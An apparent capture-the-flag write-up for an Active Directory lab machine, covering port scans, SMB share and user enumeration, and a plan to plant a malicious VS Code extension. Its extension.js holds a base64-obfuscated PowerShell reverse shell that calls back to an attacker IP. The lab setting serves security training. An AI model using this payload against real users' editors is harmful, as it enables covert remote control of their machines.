# Checkpoint

## Nmap scan:
```
Nmap scan report for 10.129.16.177
Host is up (0.023s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-06-16 19:32:59Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb, Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf            .NET Message Framing
49664/tcp open  msrpc             Microsoft Windows RPC
49670/tcp open  msrpc             Microsoft Windows RPC
49671/tcp open  msrpc             Microsoft Windows RPC
49675/tcp open  msrpc             Microsoft Windows RPC
49676/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49679/tcp open  msrpc             Microsoft Windows RPC
49706/tcp open  msrpc             Microsoft Windows RPC
49714/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m58s
| smb2-time: 
|   date: 2026-06-16T19:33:49
|_  start_date: N/A
```

## Writeup:
We start with the following credentials, thus this box simulates an assumed breach scenario:
- `alex.turner:Checkpoint2024!`

I add the domain `checkpoint.htb` to my `/etc/hosts`.

I also run a quick `UDP` scan:
```
Nmap scan report for 10.129.16.177
Host is up (0.019s latency).
Not shown: 97 open|filtered udp ports (no-response)
PORT    STATE SERVICE      VERSION
53/udp  open  domain       Simple DNS Plus
88/udp  open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-06-16 19:31:34Z)
123/udp open  ntp          NTP v3
```

I quickly enumerate the shares using `nxc` and the `--shares` flag:
```
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
DevDrop         READ            VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share 
SYSVOL          READ            Logon server share 
VMBackups                       
```

The `DevDrop` share looks pretty interesting.
While I'm enumerating I also dump the users, once again using `nxc` and the `--users` flag.
```
SMB         10.129.16.177   445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.16.177   445    DC01             Administrator                 2026-05-09 16:16:34 0       Built-in account for administering the computer/domain 
SMB         10.129.16.177   445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.16.177   445    DC01             krbtgt                        2026-05-09 08:41:01 0       Key Distribution Center Service Account 
SMB         10.129.16.177   445    DC01             alex.turner                   2026-05-09 09:00:08 0        
SMB         10.129.16.177   445    DC01             ryan.brooks                   2026-05-10 13:46:18 0        
SMB         10.129.16.177   445    DC01             svc_deploy                    2026-05-09 09:01:19 0       Deployment service account 
SMB         10.129.16.177   445    DC01             james.harper                  2026-05-09 09:02:53 0        
SMB         10.129.16.177   445    DC01             sarah.mitchell                2026-05-09 09:02:58 0        
SMB         10.129.16.177   445    DC01             emily.carter                  2026-05-09 09:03:05 0        
SMB         10.129.16.177   445    DC01             david.reynolds                2026-05-09 09:03:11 0        
SMB         10.129.16.177   445    DC01             jessica.coleman               2026-05-09 09:03:15 0        
SMB         10.129.16.177   445    DC01             lauren.flores                 2026-05-09 09:03:21 0        
SMB         10.129.16.177   445    DC01             michael.torres                2026-05-09 09:03:28 0        
SMB         10.129.16.177   445    DC01             kevin.patterson               2026-05-09 09:03:33 0        
SMB         10.129.16.177   445    DC01             brian.jenkins                 2026-05-09 09:03:37 0        
SMB         10.129.16.177   445    DC01             megan.perry                   2026-05-09 09:03:42 0        
SMB         10.129.16.177   445    DC01             max.palmer                    2026-05-26 01:25:15 0        
```

From `enum4linux-ng` I also find a potentially interesting group:
```
'1110':
  groupname: DevTeam
  type: domain
```
The group has the following members:
- `Brian Jenkins`
- `Michael Torres` 
- `Ryan Brooks`

From all of this enumeration, I have the feeling that the solution to initial access lies with uploading a malicious `.vsix` Visual Studio Code extension.

Alright after looking into how to make Visual Studio Code Extensions, I've got a working prototype. 
The payload code is as follows within the `extension.js` file:
```
const cprocess = require('child_process')
cprocess.exec('curl http://10.10.15.217')
cprocess.exec('powershell -nop -w hidden -ep bypass -e JExIT1NUID0gIjEwLjEwLjE1LjIxNyI7ICRMUE9SVCA9IDkwMDE7ICRUQ1BDbGllbnQgPSBOZXctT2JqZWN0IE5ldC5Tb2NrZXRzLlRDUENsaWVudCgkTEhPU1QsICRMUE9SVCk7ICROZXR3b3JrU3RyZWFtID0gJFRDUENsaWVudC5HZXRTdHJlYW0oKTsgJFN0cmVhbVJlYWRlciA9IE5ldy1PYmplY3QgSU8uU3RyZWFtUmVhZGVyKCROZXR3b3JrU3RyZWFtKTsgJFN0cmVhbVdyaXRlciA9IE5ldy1PYmplY3QgSU8uU3RyZWFtV3JpdGVyKCROZXR3b3JrU3RyZWFtKTsgJFN0cmVhbVdyaXRlci5BdXRvRmx1c2ggPSAkdHJ1ZTsgJEJ1ZmZlciA9IE5ldy1PYmplY3QgU3lzdGVtLkJ5dGVbXSAxMDI0OyB3aGlsZSAoJFRDUENsaWVudC5Db25uZWN0ZWQpIHsgd2hpbGUgKCROZXR3b3JrU3RyZWFtLkRhdGFBdmFpbGFibGUpIHsgJFJhd0RhdGEgPSAkTmV0d29ya1N0cmVhbS5SZWFkKCRCdWZmZXIsIDAsICRCdWZmZXIuTGVuZ3RoKTsgJENvZGUgPSAoW3RleHQuZW5jb2RpbmddOjpVVEY4KS5HZXRTdHJpbmcoJEJ1ZmZlciwgMCwgJFJhd0RhdGEgLTEpIH07IGlmICgkVENQQ2xpZW50LkNvbm5lY3RlZCAtYW5kICRDb2RlLkxlbmd0aCAtZ3QgMSkgeyAkT3V0cHV0ID0gdHJ5IHsgSW52b2tlLUV4cHJlc3Npb24gKCRDb2RlKSAyPiYxIH0gY2F0Y2ggeyAkXyB9OyAkU3RyZWFtV3JpdGVyLldyaXRlKCIkT3V0cHV0YG4iKTsgJENvZGUgPSAkbnVsbCB9IH07ICRUQ1BDbGllbnQuQ2xvc2UoKTsgJE5ldHdvcmtTdHJlYW0uQ2xvc2UoKTsgJFN0cmVhbVJlYWRlci5DbG9zZSgpOyAkU3RyZWFtV3JpdGVyLkNsb3NlKCk=')
```
The powershell code is base64 encoded.

## Commands Used:
- `nxc smb checkpoint.htb -u alex.turner -p Checkpoint2024!`
- `bloodyad --host 10.129.16.177 -d checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' get writable`
